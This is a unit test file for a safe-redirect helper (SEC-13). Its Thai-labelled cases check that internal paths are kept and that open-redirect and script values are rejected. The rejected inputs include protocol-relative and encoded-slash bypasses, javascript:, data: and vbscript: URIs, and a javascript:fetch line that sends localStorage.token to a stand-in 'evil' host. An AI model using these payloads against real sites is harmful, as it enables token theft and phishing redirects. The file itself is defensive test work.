import { getSafeRedirect } from './safe-redirect';

describe('getSafeRedirect (SEC-13)', () => {
  it.each([
    ['/dashboard', '/dashboard'],
    ['/practice/exam/abc?x=1#h', '/practice/exam/abc?x=1#h'],
    ['/', '/'],
    ['/blog/%E0%B8%84%E0%B8%93%E0%B8%B4%E0%B8%95', '/blog/%E0%B8%84%E0%B8%93%E0%B8%B4%E0%B8%95'],
    ['/practice/exam/abc?redirect=/dashboard', '/practice/exam/abc?redirect=/dashboard'],
    // คืนค่าที่ normalize แล้ว
    ['/a/b/..//evil', '/a//evil'],
    ['/blog/คณิต', '/blog/%E0%B8%84%E0%B8%93%E0%B8%B4%E0%B8%95'],
    ['/practice/./exam/../exam/abc', '/practice/exam/abc'],
  ])('คง path ภายใน %p', (input, expected) => {
    expect(getSafeRedirect(input)).toBe(expected);
  });

  it.each([
    'https://evil.example',
    'http://evil.example/dashboard',
    '//evil.example',
    '/\\evil.example',
    '\\\\evil',
    '\\/evil.example',
    'javascript:alert(1)',
    ' javascript:alert(1)',
    'JaVaScRiPt:alert(1)',
    'javascript:fetch(\'//evil/?t=\'+localStorage.token)',
    '%2F%2Fevil',
    '/%2F/evil',
    '/%2f/evil',
    '/%252F/evil',
    '/%5Cevil.example',
    '/%09/evil.example',
    '/\t/evil.example',
    '/\n/evil.example',
    '/.//evil',
    '/..//evil',
    '/%2e//evil',
    '/%2e%2e//evil',
    '/a/../..//evil',
    ' /dashboard',
    'data:text/html,<script>alert(1)</script>',
    'vbscript:msgbox(1)',
    'dashboard',
    '/%E0%A4%A',
    '',
    null,
    undefined,
  ])('ค่าไม่ปลอดภัย %p → "/"', (input) => {
    expect(getSafeRedirect(input)).toBe('/');
  });

  it('ใช้ fallback ที่ส่งมาได้', () => {
    expect(getSafeRedirect('https://evil.example', '/dashboard')).toBe('/dashboard');
  });
});
